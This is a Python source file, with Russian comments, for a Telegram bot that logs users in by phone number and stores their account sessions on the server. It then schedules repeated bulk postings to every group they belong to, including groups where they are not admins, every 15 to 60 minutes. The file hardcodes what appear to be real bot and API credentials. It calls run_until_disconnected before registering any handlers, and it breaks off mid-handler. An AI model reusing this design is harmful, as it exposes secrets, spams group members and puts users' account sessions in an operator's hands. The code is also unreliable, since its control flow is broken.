from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
import asyncio
import logging
from datetime import datetime, timedelta
import re
import os
import aiosqlite
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError
from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator, Channel

OWNER_ID = 6903472998  # Замените на ваш ID

# Укажите свои данные API
API_ID = "27245693"
API_HASH = "c7197f5d1a9bb46b03cc6981fa120b2e"
BOT_TOKEN = "7773769474:AAED9waVV3s8quGbjwl8DP_YyuTtvx6qznk"

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Клиент для бота
# Добавьте настройки прокси из изображения

from proxy_config import proxy

bot = TelegramClient(
    'bot_session',
    API_ID,
    API_HASH,
    proxy=proxy
).start(bot_token=BOT_TOKEN)

bot.run_until_disconnected()

# bot = TelegramClient(
#     'bot_session',
#     API_ID,
#     API_HASH,
#     proxy=SOCKS5_PROXY
# ).start(bot_token=BOT_TOKEN)

# bot.run_until_disconnected()

# Словарь для хранения состояний пользователей
user_states = {}  # Хранит состояние пользователя (этап диалога)
phone_codes = {}  # Хранит коды авторизации для пользователей

# Папка для хранения сессий пользователей
SESSION_FOLDER = "user_sessions"
if not os.path.exists(SESSION_FOLDER):
    os.makedirs(SESSION_FOLDER)

# Подключение к базе данных
DB_FILE = "mailing.db"

async def get_db_connection():
    """Возвращает асинхронное соединение с базой данных."""
    return await aiosqlite.connect(DB_FILE)


async def init_db():
    conn = await get_db_connection()
    try:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS mailings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                name TEXT,  -- Добавляем новое поле для названия рассылки
                groups TEXT,
                message TEXT,
                photo_path TEXT
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS mailing_times (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mailing_id INTEGER,
                send_time TEXT,
                FOREIGN KEY(mailing_id) REFERENCES mailings(id)
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                registration_date TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')
        # Попытка добавить столбец name, если он отсутствует (выполнится только если таблица уже существует)
        try:
            await conn.execute("ALTER TABLE mailings ADD COLUMN name TEXT")
        except Exception as e:
            logger.info("Столбец 'name' уже существует или его добавление не требуется: " + str(e))

        await conn.commit()
        logger.info("Таблицы созданы или уже существуют.")
    finally:
        await conn.close()


def get_session_path(user_id):
    """Возвращает путь к файлу сессии для пользователя."""
    return os.path.join(SESSION_FOLDER, f"user_{user_id}.session")

async def is_owner_in_db():
    """Проверяет, есть ли владелец в базе данных."""
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT id FROM users WHERE user_id = ?", (OWNER_ID,))
        owner = await cursor.fetchone()
        return owner is not None
    finally:
        await conn.close()

async def load_user_session(user_id):
    """Загружает сессию пользователя с использованием прокси"""
    session_path = get_session_path(user_id)
    if os.path.exists(session_path):
        client = TelegramClient(
            session_path,
            API_ID,
            API_HASH,
            proxy=proxy
        )

        if client.is_connected() and client.is_user_authorized():
            return client

        await client.connect()
        if await client.is_user_authorized():
            return client
        else:
            await client.disconnect()
    return None

async def ban_user(user_id):
    """Запрещает пользователю доступ к боту."""
    conn = await get_db_connection()
    try:
        await conn.execute("UPDATE users SET is_active = 0 WHERE user_id = ?", (user_id,))
        await conn.commit()
        logger.info(f"Пользователь с ID {user_id} заблокирован.")
    finally:
        await conn.close()

async def unban_user(user_id):
    """Возвращает пользователю доступ к боту."""
    conn = await get_db_connection()
    try:
        await conn.execute("UPDATE users SET is_active = 1 WHERE user_id = ?", (user_id,))
        await conn.commit()
        logger.info(f"Пользователь с ID {user_id} разблокирован.")
    finally:
        await conn.close()

async def save_mailing(user_id, mailing_name, groups, message, photo_path, selected_times):
    """Сохраняет рассылку в базу данных и возвращает её ID."""
    conn = await get_db_connection()
    try:
        # Извлекаем имена групп или их ID
        group_names = [group.entity.title if hasattr(group.entity, 'title') else str(group.id) for group in groups]

        # Сохраняем рассылку с названием
        cursor = await conn.cursor()
        await cursor.execute(
            "INSERT INTO mailings (user_id, name, groups, message, photo_path) VALUES (?, ?, ?, ?, ?)",
            (user_id, mailing_name, ', '.join(group_names), message, photo_path)
        )
        mailing_id = cursor.lastrowid  # Получаем ID созданной рассылки

        # Сохраняем времена рассылки
        for hour, minute in selected_times:
            send_time = datetime.now().replace(hour=hour, minute=minute, second=0, microsecond=0)
            await cursor.execute(
                "INSERT INTO mailing_times (mailing_id, send_time) VALUES (?, ?)",
                (mailing_id, send_time.strftime('%Y-%m-%d %H:%M'))
            )

        await conn.commit()
        return mailing_id
    finally:
        await conn.close()


async def fetch_mailings(user_id):
    """Возвращает список рассылок для пользователя."""
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT id, groups, message, photo_path FROM mailings WHERE user_id = ?", (user_id,))
        mailings = await cursor.fetchall()

        # Добавляем времена рассылок
        for mailing in mailings:
            mailing_id = mailing[0]
            await cursor.execute("SELECT send_time FROM mailing_times WHERE mailing_id = ?", (mailing_id,))
            times = await cursor.fetchall()
            mailing += (times,)

        return mailings
    finally:
        await conn.close()

async def show_mailing_list(event, user_id):
    """Отображает список рассылок в виде кнопок и удаляет старые рассылки."""
    # Обновляем запрос, чтобы получать название (name)
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT id, name, groups, message, photo_path FROM mailings WHERE user_id = ?", (user_id,))
        mailings = await cursor.fetchall()

        # Добавляем времена рассылок
        for mailing in mailings:
            mailing_id = mailing[0]
            await cursor.execute("SELECT send_time FROM mailing_times WHERE mailing_id = ?", (mailing_id,))
            times = await cursor.fetchall()
            mailing += (times,)

        if not mailings:
            buttons_empty = [[Button.inline("Назад", b"back")]]
            await event.respond("История рассылок пуста.", buttons=buttons_empty)
            return

        buttons = []
        current_time = datetime.now()
        # Проверка и удаление старых рассылок остаётся без изменений
        for mailing in mailings:
            mailing_id = mailing[0]
            mailing_name = mailing[1]  # Новое поле: название рассылки
            await cursor.execute("SELECT send_time FROM mailing_times WHERE mailing_id = ? ORDER BY send_time ASC LIMIT 1", (mailing_id,))
            first_send_time = await cursor.fetchone()

            if first_send_time:
                first_send_time = datetime.strptime(first_send_time[0], '%Y-%m-%d %H:%M')
                if (current_time - first_send_time).days > 30:
                    photo_path = mailing[4]
                    if photo_path and os.path.exists(photo_path):
                        os.remove(photo_path)
                        logger.info(f"Файл {photo_path} удалён.")
                    await delete_mailing(mailing_id, user_id)
                    logger.info(f"Рассылка {mailing_id} удалена (старше месяца).")
                    continue

            # Если рассылка не старше месяца, отображаем название (если его нет, используем id)
            display = mailing_name if mailing_name and mailing_name.strip() else f"Рассылка {mailing_id}"
            buttons.append([Button.inline(display, f"show_mailing_{mailing_id}")])
    finally:
        await conn.close()

    if not buttons:
        buttons_empty = [[Button.inline("Назад", b"back")]]
        await event.respond("История рассылок пуста.", buttons=buttons_empty)
        return

    buttons.append([Button.inline("Назад", b"back")])
    await event.respond("Выберите рассылку для просмотра:", buttons=buttons)


async def delete_mailing(mailing_id, user_id):
    """Удаляет рассылку из базы данных по её ID."""
    conn = await get_db_connection()
    try:
        await conn.execute("DELETE FROM mailings WHERE id = ? AND user_id = ?", (mailing_id, user_id))
        await conn.commit()
    finally:
        await conn.close()

@bot.on(events.CallbackQuery(pattern=b"back_to_mailing_list"))
async def back_to_mailing_list(event):
    user_id = event.sender_id
    await show_mailing_list(event, user_id)

@bot.on(events.CallbackQuery(pattern=r"show_mailing_(\d+)"))
async def show_mailing_details(event):
    mailing_id = int(event.pattern_match.group(1))
    user_id = event.sender_id
    await event.respond("Обработка...")

    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        # Получаем информацию о рассылке
        await cursor.execute(
            "SELECT groups, message, photo_path FROM mailings WHERE id = ? AND user_id = ?",
            (mailing_id, user_id)
        )
        mailing = await cursor.fetchone()
        if not mailing:
            await event.answer("Рассылка не найдена.")
            return

        groups, message, photo_path = mailing
        response = f"Группы: {groups}\nСообщение: {message}"

        # Получаем времена отправки для этой рассылки
        await cursor.execute(
            "SELECT send_time FROM mailing_times WHERE mailing_id = ? ORDER BY send_time ASC",
            (mailing_id,)
        )
        times = await cursor.fetchall()

        if times:
            times_str = "\nВремена отправки:\n"
            for time in times:
                send_time = datetime.strptime(time[0], '%Y-%m-%d %H:%M')
                times_str += f"- {send_time.strftime('%H:%M')}, "
            response += times_str

        # Если есть фото, отправляем его через client.send_file, так как event.respond не поддерживает caption
        if photo_path:
            if len(response) > MAX_CAPTION_LENGTH:
                caption = response[:MAX_CAPTION_LENGTH]
                await event.client.send_file(event.chat_id, photo_path, caption=caption)
                remaining_text = response[MAX_CAPTION_LENGTH:]
                for chunk in split_text(remaining_text):
                    await event.respond(chunk)
            else:
                await event.client.send_file(event.chat_id, photo_path, caption=response)
        else:
            await event.respond(response)

        # Добавляем кнопки для удаления рассылки и кнопку "Назад"
        await event.respond("Выберите действие:", buttons=[
            [Button.inline("Удалить рассылку", f"delete_mailing_{mailing_id}")],
            [Button.inline("Назад", b"back_to_mailing_list")]
        ])
    finally:
        await conn.close()

@bot.on(events.CallbackQuery(pattern=r"delete_mailing_(\d+)"))
async def delete_mailing_handler(event):
    mailing_id = int(event.pattern_match.group(1))
    user_id = event.sender_id

    await delete_mailing(mailing_id, user_id)
    await event.respond(f"Рассылка {mailing_id} удалена.")
    await show_mailing_list(event, user_id)

async def fetch_users():
    """Возвращает список пользователей из базы данных."""
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT id, user_id, username, first_name, last_name, is_active FROM users")
        users = await cursor.fetchall()
        return users
    finally:
        await conn.close()

async def save_user(user_id, username, first_name, last_name):
    """Сохраняет информацию о пользователе в базу данных."""
    conn = await get_db_connection()
    try:
        await conn.execute(
            "INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, registration_date, is_active) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, username, first_name, last_name, datetime.now().strftime('%Y-%m-%d %H:%M'), 1))
        await conn.commit()
    finally:
        await conn.close()

async def delete_user(user_db_id):
    """Удаляет пользователя из базы данных по ID и его сессию."""
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        logger.info(f"Попытка удалить пользователя с ID: {user_db_id}")

        # Получаем user_id (Telegram ID) пользователя по его ID в базе данных
        await cursor.execute("SELECT user_id FROM users WHERE id = ?", (user_db_id,))
        user = await cursor.fetchone()
        if user:
            user_id = user[0]
            # Удаляем запись из базы данных
            await cursor.execute("DELETE FROM users WHERE id = ?", (user_db_id,))
            await conn.commit()
            logger.info(f"Пользователь с ID {user_db_id} удалён из базы данных.")

            # Удаляем сессию пользователя
            delete_user_session(user_id)

            # Очищаем состояние пользователя
            if user_id in user_states:
                del user_states[user_id]
                logger.info(f"Состояние пользователя {user_id} очищено.")
        else:
            logger.info(f"Пользователь с ID {user_db_id} не найден в базе данных.")
    except Exception as e:
        logger.error(f"Ошибка при удалении пользователя с ID {user_db_id}: {e}")
    finally:
        await conn.close()

def normalize_username(username):
    """Нормализует имя пользователя: удаляет пробелы и приводит к нижнему регистру."""
    return username.strip().lower()

async def user_exists(username):
    """Проверяет, существует ли пользователь с таким именем."""
    normalized_username = normalize_username(username)
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT username FROM users")
        users = await cursor.fetchall()
        for user in users:
            if normalize_username(user[0]) == normalized_username:
                return True
        return False
    finally:
        await conn.close()

async def show_user_selection(event, state):
    """Отображает список пользователей с кнопками выбора."""
    users = state['users']
    selected_users = state.get('selected_users', [])

    # Формируем список кнопок
    buttons = []
    for user in users:
        user_db_id = user[0]  # ID из базы данных
        user_id = user[1]  # user_id из Telegram
        username = user[2] if user[2] else "Без username"
        first_name = user[3] if user[3] else ""
        last_name = user[4] if user[4] else ""
        is_active = user[5]  # Новый столбец is_active
        display_name = f"{user_db_id}: {username} ({first_name} {last_name})".strip()
        mark = "✅" if user_db_id in selected_users else "🔲"
        status = "🟢" if is_active else "🔴"
        buttons.append([Button.inline(f"{mark} {status} {display_name}", f"select_user_{user_db_id}")])

    # Добавляем кнопки "Заблокировать", "Разблокировать" и "Отмена"
    buttons.append([
        Button.inline("Заблокировать", b"ban_selected_users"),
        Button.inline("Разблокировать", b"unban_selected_users"),
        Button.inline("Отмена", b"cancel_user_selection")
    ])

    # Если это коллбэк (CallbackQuery), используем event.edit, иначе event.respond
    if isinstance(event, events.CallbackQuery.Event):
        await event.edit("Выберите пользователей для управления доступом:", buttons=buttons)
    else:
        await event.respond("Выберите пользователей для управления доступом:", buttons=buttons)

def delete_user_session(user_id):
    """Удаляет файл сессии пользователя."""
    session_path = get_session_path(user_id)
    if os.path.exists(session_path):
        os.remove(session_path)
        logger.info(f"Сессия пользователя {user_id} удалена.")
    else:
        logger.info(f"Файл сессии пользователя {user_id} не найден.")

async def print_all_users():
    """Выводит всех пользователей из базы данных."""
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT username FROM users")
        users = await cursor.fetchall()
        logger.info("Список пользователей в базе данных:")
        for user in users:
            logger.info(f"Пользователь: '{user[0]}'")
    finally:
        await conn.close()

# Добавляем словарь для хранения времени последнего вызова команды /start
last_start_time = {}


@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    current_time = datetime.now()

    # Проверяем, авторизован ли пользователь и активен ли его аккаунт
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT is_active FROM users WHERE user_id = ?", (user_id,))
        user = await cursor.fetchone()

        # Если пользователь найден и он заблокирован
        if user and user[0] == 0:
            await event.respond("⛔ Ваш доступ заблокирован. Обратитесь к администратору @JerdeshMoskva_admin")
            return
    finally:
        await conn.close()

    # Проверяем, есть ли уже загруженная сессия в user_states
    if user_id in user_states and 'client' in user_states[user_id]:
        client = user_states[user_id]['client']
        # Проверяем, авторизован ли клиент
        if await client.is_user_authorized():
            # Показываем меню без повторной загрузки сессии
            buttons = [
                [Button.inline("Создать рассылку", b"create_mailing")],
                [Button.inline("Список рассылок", b"mailing_list")]
            ]
            if user_id == OWNER_ID:
                buttons.append([Button.inline("Список пользователей", b"user_list")])
            await event.respond("Вы уже авторизованы! Выберите действие:", buttons=buttons)
            return

    # Если сессии нет в user_states, пробуем загрузить
    client = await load_user_session(user_id)
    if client:
        # Сохраняем клиент в user_states
        user_states[user_id] = {
            'stage': 'authorized',
            'client': client
        }
        # Проверяем, является ли пользователь владельцем
        if user_id == OWNER_ID:
            buttons = [
                [Button.inline("Создать рассылку", b"create_mailing")],
                [Button.inline("Список рассылок", b"mailing_list")],
                [Button.inline("Список пользователей", b"user_list")]
            ]
        else:
            # Если пользователь не владелец, проверяем, был ли он одобрен
            conn = await get_db_connection()
            try:
                cursor = await conn.cursor()
                await cursor.execute("SELECT is_active FROM users WHERE user_id = ?", (user_id,))
                user = await cursor.fetchone()
                if user and user[0] == 1:
                    buttons = [
                        [Button.inline("Создать рассылку", b"create_mailing")],
                        [Button.inline("Список рассылок", b"mailing_list")]
                    ]
                else:
                    await event.respond("⛔ Ваш доступ ограничен. Обратитесь к администратору @JerdeshMoskva_admin")
                    return
            finally:
                await conn.close()

        await event.respond("Вы уже авторизованы! Выберите действие:", buttons=buttons)
        return

    # Инициализируем состояние пользователя
    user_states[user_id] = {'stage': 'start'}
    logger.info(f"User {user_id} started the bot.")

    conn = None
    try:
        conn = await get_db_connection()
        cursor = await conn.cursor()
        await cursor.execute("SELECT id, is_active FROM users WHERE user_id = ?", (user_id,))
        user = await cursor.fetchone()

        # Если пользователь уже зарегистрирован, но не авторизован
        if user:
            user_db_id, is_active = user
            if not is_active:
                await event.respond(
                    "⛔ Вы успешно авторизованы, но ваш доступ ограничен. Обратитесь к администратору @JerdeshMoskva_admin, затем снова нажмите /start"
                )
                return
            else:
                # Если у пользователя есть сохранённая сессия, авторизуем его
                client = await load_user_session(user_id)
                if client:
                    user_states[user_id]['stage'] = 'authorized'
                    user_states[user_id]['client'] = client

                    buttons = [
                        [Button.inline("Создать рассылку", b"create_mailing")],
                        [Button.inline("Список рассылок", b"mailing_list")]
                    ]
                    if user_id == OWNER_ID:
                        buttons.append([Button.inline("Список пользователей", b"user_list")])
                    await event.respond("Вы уже авторизованы! Выберите действие:", buttons=buttons)
                    return
                else:
                    await event.respond(
                        "Привет! Для использования бота введите свой номер телефона в формате +XXXXXXXXXXX.")
                    user_states[user_id]['stage'] = 'waiting_phone'
        else:
            # Если пользователь ещё не зарегистрирован, начинаем процесс авторизации
            await event.respond("Привет! Для использования бота введите свой номер телефона в формате +XXXXXXXXXXX.")
            user_states[user_id]['stage'] = 'waiting_phone'
    except Exception as e:
        logger.error(f"Ошибка при обработке команды /start для пользователя {user_id}: {e}")
        await event.respond("⚠️ Произошла ошибка. Пожалуйста, попробуйте снова.")
    finally:
        if conn:
            await conn.close()



MAX_CAPTION_LENGTH = 1024  # Лимит для подписи к медиа
MAX_TEXT_LENGTH = 4096     # Лимит для обычного текстового сообщения

def split_text(text, chunk_size=MAX_TEXT_LENGTH):
    """Разбивает текст на части указанного размера."""
    return [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]


@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    user_id = event.sender_id
    logger.info(f"User {user_id} requested help.")

    # Путь к видеофайлу
    video_path = "help_video/IMG_7569.MOV"  # Укажите путь к вашему видеофайлу

    # Проверяем, существует ли файл
    if not os.path.exists(video_path):
        await event.respond("Видео не найдено. Пожалуйста, свяжитесь с администратором.")
        logger.error(f"Video file not found: {video_path}")
        return

    # Отправляем видео
    try:
        await event.respond("Загрузка видео... (это может занять несколько минут)")
        await event.respond("Вот видео с инструкцией:", file=video_path)
        logger.info(f"Video sent to user {user_id}.")
    except Exception as e:
        await event.respond("Ошибка при отправке видео. Пожалуйста, попробуйте снова.")
        logger.error(f"Error sending video to user {user_id}: {e}")

async def is_user_authorized(user_id):
    """Проверяет, авторизован ли пользователь и существует ли он в базе данных."""
    conn = await get_db_connection()
    try:
        cursor = await conn.cursor()
        await cursor.execute("SELECT id FROM users WHERE user_id = ?", (user_id,))
        user_exists = await cursor.fetchone()
        return user_exists is not None
    finally:
        await conn.close()

async def show_time_selection(event, state):
    """Отображает кнопки с временами для выбора, учитывая интервал."""
    interval = state.get('interval', 30)  # По умолчанию интервал 30 минут
    selected_times = state.get('selected_times', [])

    # Проверяем, что интервал не меньше 15 минут
    if interval < 15:
        await event.respond("Интервал не может быть меньше 15 минут. Установлен интервал по умолчанию: 30 минут.")
        interval = 30  # Устанавливаем интервал по умолчанию
        state['interval'] = interval  # Обновляем интервал в состоянии

    now = datetime.now()
    start_time = now + timedelta(minutes=2)

    # Если selected_times пуст, выбираем все времена по умолчанию
    if not selected_times:
        selected_times = []
        for i in range(24 * 60 // interval):  # Количество интервалов в 24 часах
            send_time = start_time + timedelta(minutes=i * interval)
            selected_times.append((send_time.hour, send_time.minute))
        state['selected_times'] = selected_times

    buttons = []
    row = []
    for i in range(24 * 60 // interval):  # Количество интервалов в 24 часах
        send_time = start_time + timedelta(minutes=i * interval)
        hour = send_time.hour
        minute = send_time.minute

        mark = "✅" if (hour, minute) in selected_times else "🕒"
        row.append(Button.inline(f"{mark} {hour:02d}:{minute:02d}", f"select_hour_{hour}_{minute}"))

        if len(row) == 2:  # Два времени в строке
            buttons.append(row)
            row = []

    if row:  # Добавляем оставшиеся кнопки
        buttons.append(row)

    # Всегда добавляем кнопки "Подтвердить" и "Назад"
    buttons.append([Button.inline("Подтвердить", b"confirm_mailing")])
    buttons.append([Button.inline("Назад", b"back_to_interval")])

    # Проверяем, является ли событие CallbackQuery
    if isinstance(event, events.CallbackQuery.Event):
        try:
            await event.edit("Выберите время рассылки (все времена выбраны по умолчанию, отмените ненужные):", buttons=buttons)
        except Exception as e:
            logger.error(f"Ошибка при редактировании сообщения: {e}")
            # Если не удалось отредактировать, отправляем новое сообщение
            await event.respond("Выберите время рассылки (все времена выбраны по умолчанию, отмените ненужные):", buttons=buttons)
    else:
        await event.respond("Выберите время рассылки (все времена выбраны по умолчанию, отмените ненужные):", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    if user_id not in user_states:
        await event.answer("Сначала введите /start")
        return

    state = user_states[user_id]

    # Обработка кнопки "Отмена"
    if event.data == b"cancel_user_selection":
        state['stage'] = 'authorized'
        await event.edit("Выбор пользователей отменён.", buttons=[
            [Button.inline("Создать рассылку", b"create_mailing")],
            [Button.inline("Список рассылок", b"mailing_list")],
            [Button.inline("Список пользователей", b"user_list")]
        ])
        return

    elif event.data == b"create_mailing":
        print(state)
        if 'client' not in state:
            await event.answer("Сначала авторизуйтесь.")
            return

        # Переходим к этапу выбора типа групп
        state['stage'] = 'choosing_group_type'
        await event.edit("Выберите тип групп:", buttons=[
            [Button.inline("Где я админ", b"admin_groups")],
            [Button.inline("Где я не админ", b"non_admin_groups")],
            ([Button.inline("Назад", b"back")])
        ])
        return

    # Обработка кнопки "Где я админ"
    elif event.data == b"admin_groups":
        if 'client' not in state:
            await event.answer("Сначала авторизуйтесь.")
            return

        # Собираем группы, где пользователь является администратором
        client = state['client']
        groups_admin = []

        async with client:
            async for dialog in client.iter_dialogs(limit=1000):
                if isinstance(dialog.entity, Channel) and dialog.entity.megagroup:
                    try:
                        participant = await client(GetParticipantRequest(dialog.entity, user_id))
                        print(dialog.name)
                        if isinstance(participant.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)):
                            groups_admin.append(dialog)
                    except Exception as e:
                        logger.error(f"Ошибка при проверке прав администратора: {e}")

        buttons = []
        buttons.append([Button.inline("Назад", b"back")])

        if not groups_admin:
            await event.respond("Вы не являетесь администратором ни в одной группе.", buttons=buttons)
            return

        # Сохраняем группы в состояние
        state['admin_groups'] = groups_admin
        if 'non_admin_groups' in state:
            del state['non_admin_groups']

        state['selected'] = []
        state['stage'] = 'choosing_groups'

        # Показываем пользователю список групп с кнопками
        await show_group_selection(event, state)
        return

    # Обработка кнопки "Где я не админ"
    elif event.data == b"non_admin_groups":
        if 'client' not in state:
            await event.answer("Сначала авторизуйтесь.")
            return

        # Собираем группы, где пользователь не является администратором
        client = state['client']
        groups_non_admin = []

        async with client:
            async for dialog in client.iter_dialogs(limit=1000):
                if isinstance(dialog.entity, Channel) and dialog.entity.megagroup:
                    try:
                        participant = await client(GetParticipantRequest(dialog.entity, user_id))
                        print(dialog.name)
                        if not isinstance(participant.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)):
                            groups_non_admin.append(dialog)
                    except Exception as e:
                        logger.error(f"Ошибка при проверке прав администратора: {e}")
                        groups_non_admin.append(dialog)

        if not groups_non_admin:
            await event.respond("Вы не состоите ни в одной группе, где вы не являетесь администратором.")
            return

        # Сохраняем группы в состояние
        state['non_admin_groups'] = groups_non_admin
        if 'admin_groups' in state:
            del state['admin_groups']
        state['selected'] = []
        state['stage'] = 'choosing_groups'

        # Показываем пользователю список групп с кнопками
        await show_group_selection(event, state)
        return

    elif event.data == b"back":
        state['stage'] = 'authorized'

        await event.edit(buttons=[
            [Button.inline("Создать рассылку", b"create_mailing")],
            [Button.inline("Список рассылок", b"mailing_list")],
            [Button.inline("Список пользователей", b"user_list")]
        ])
        return

    elif event.data == b"mailing_list":
        state['stage'] = 'authorized'
        await show_mailing_list(event, user_id)

    elif event.data == b"user_list":
        if user_id != OWNER_ID:
            await event.answer("Эта функция доступна только владельцу бота.")
            return
        # Загружаем список пользователей
        users = await fetch_users()
        if not users:
            await event.respond("Список пользователей пуст.")
        else:
            # Сохраняем список пользователей в состояние
            state['users'] = users
            state['selected_users'] = []
            state['stage'] = 'authorized'
            await show_user_selection(event, state)

    elif event.data == b"confirm_mailing":
        if 'selected_times' not in state or not state['selected_times']:
            await event.answer("Выберите хотя бы одно время!")
            return

        selected_times = state['selected_times']
        text = state['text']
        selected_groups = state['selected']
        media = state.get('media', None)
        mailing_name = state.get('mailing_name', f"Рассылка {datetime.now().strftime('%Y%m%d%H%M%S')}")

        # Сохраняем рассылку в базу данных, передавая название
        mailing_id = await save_mailing(user_id, mailing_name, selected_groups, text, media['path'] if media else None,
                                        selected_times)
        # Показываем стартовое меню
        buttons = [
            [Button.inline("Создать рассылку", b"create_mailing")],
            [Button.inline("Список рассылок", b"mailing_list")]
        ]
        if user_id == OWNER_ID:
            buttons.append([Button.inline("Список пользователей", b"user_list")])

        logger.info(f"Состояние пользователя {user_id}: {state}")
        await event.respond("Рассылка успешно завершена! Выберите действие:", buttons=buttons)

        # Планируем отправку для каждого выбранного времени
        for hour, minute in selected_times:
            send_time = datetime.now().replace(hour=hour, minute=minute, second=0, microsecond=0)
            if send_time < datetime.now():
                send_time += timedelta(days=1)

            delay = (send_time - datetime.now()).total_seconds()
            if delay > 0:
                await asyncio.sleep(delay)

            client = state['client']
            async with client:
                for group in selected_groups:
                    try:
                        if media:
                            if media['type'] == 'photo':
                                if len(text) <= MAX_CAPTION_LENGTH:
                                    logger.info(f"Фото отправлено в группу {group.name} (ID: {group.id})")
                                    await client.send_file(group.id, media['path'], caption=text)
                                else:
                                    caption = text[:MAX_CAPTION_LENGTH]
                                    logger.info(
                                        f"Фото отправлено в группу {group.name} (ID: {group.id}) с обрезанной подписью")
                                    await client.send_file(group.id, media['path'], caption=caption)
                                    remaining_text = text[MAX_CAPTION_LENGTH:]
                                    for chunk in split_text(remaining_text):
                                        await client.send_message(group.id, chunk)
                            elif media['type'] == 'video':
                                if len(text) <= MAX_CAPTION_LENGTH:
                                    logger.info(f"Видео отправлено в группу {group.name} (ID: {group.id})")
                                    await client.send_file(group.id, media['path'], caption=text,
                                                           supports_streaming=True)
                                else:
                                    caption = text[:MAX_CAPTION_LENGTH]
                                    logger.info(
                                        f"Видео отправлено в группу {group.name} (ID: {group.id}) с обрезанной подписью")
                                    await client.send_file(group.id, media['path'], caption=caption,
                                                           supports_streaming=True)
                                    remaining_text = text[MAX_CAPTION_LENGTH:]
                                    for chunk in split_text(remaining_text):
                                        await client.send_message(group.id, chunk)
                        else:
                            if len(text) <= MAX_TEXT_LENGTH:
                                logger.info(f"Сообщение отправлено в группу {group.name} (ID: {group.id})")
                                await client.send_message(group.id, text)
                            else:
                                for chunk in split_text(text):
                                    await client.send_message(group.id, chunk)
                    except Exception as e:
                        logger.error(f"Ошибка при отправке в группу {group.name}: {e}")

        state['stage'] = 'authorized'
        state.pop('selected_times', None)
        state.pop('text', None)
        state.pop('selected', None)
        state.pop('media', None)

        return

    elif event.data.startswith(b"select_user_"):
        # Обработка выбора пользователя
        selected_user_db_id = int(event.data.decode().replace("select_user_", ""))
        selected_users = state.get('selected_users', [])
        logger.info(f"Текущие выбранные пользователи: {selected_users}")
        logger.info(f"Пользователь с ID {selected_user_db_id} выбран/снят с выбора.")
        # Добавляем или убираем пользователя из выбранных
        if selected_user_db_id in selected_users:
            selected_users.remove(selected_user_db_id)
        else:
            selected_users.append(selected_user_db_id)
        # Обновляем состояние
        state['selected_users'] = selected_users
        logger.info(f"Обновлённый список выбранных пользователей: {selected_users}")
        await show_user_selection(event, state)

    elif event.data == b"ban_selected_users":
        # Блокировка выбранных пользователей
        selected_users = state.get('selected_users', [])
        if not selected_users:
            await event.answer("Выберите хотя бы одного пользователя!")
            return
        for user_db_id in selected_users:
            # Получаем user_id (Telegram ID) по user_db_id
            conn = await get_db_connection()
            try:
                cursor = await conn.cursor()
                await cursor.execute("SELECT user_id FROM users WHERE id = ?", (user_db_id,))
                user = await cursor.fetchone()
                if user:
                    user_id = user[0]
                    await ban_user(user_id)  # Блокируем по user_id
            finally:
                await conn.close()
        state['stage'] = 'authorized'
        await event.edit("Выбранные пользователи заблокированы.", buttons=[
            [Button.inline("Создать рассылку", b"create_mailing")],
            [Button.inline("Список рассылок", b"mailing_list")],
            [Button.inline("Список пользователей", b"user_list")]
        ])
    elif event.data == b"unban_selected_users":
        # Разблокировка выбранных пользователей
        selected_users = state.get('selected_users', [])
        if not selected_users:
            await event.answer("Выберите хотя бы одного пользователя!")
            return
        for user_db_id in selected_users:
            # Получаем user_id (Telegram ID) по user_db_id
            conn = await get_db_connection()
            try:
                cursor = await conn.cursor()
                await cursor.execute("SELECT user_id FROM users WHERE id = ?", (user_db_id,))
                user = await cursor.fetchone()
                if user:
                    user_id = user[0]
                    await unban_user(user_id)  # Разблокируем по user_id
            finally:
                await conn.close()
        state['stage'] = 'authorized'
        await event.edit("Выбранные пользователи разблокированы.", buttons=[
            [Button.inline("Создать рассылку", b"create_mailing")],
            [Button.inline("Список рассылок", b"mailing_list")],
            [Button.inline("Список пользователей", b"user_list")]
        ])


    # Обработка выбора интервала отправки
    elif event.data.startswith(b"select_interval_"):
        interval = int(event.data.decode().replace("select_interval_", ""))
        state['interval'] = interval
        state['selected_times'] = []  # Очищаем выбранные времена
        await show_time_selection(event, state)
        return

    # Обработка кнопки "Назад" к выбору интервала
    elif event.data == b"back_to_interval":
        state['stage'] = 'choosing_interval'
        await event.edit("Выберите интервал отправки:", buttons=[
            [Button.inline("15 минут", b"select_interval_15")],
            [Button.inline("20 минут", b"select_interval_20")],
            [Button.inline("30 минут", b"select_interval_30")],
            [Button.inline("1 час", b"select_interval_60")],
            [Button.inline("Другое время", b"custom_interval")]
        ])
        return

    # Обработка кнопки выбора времени
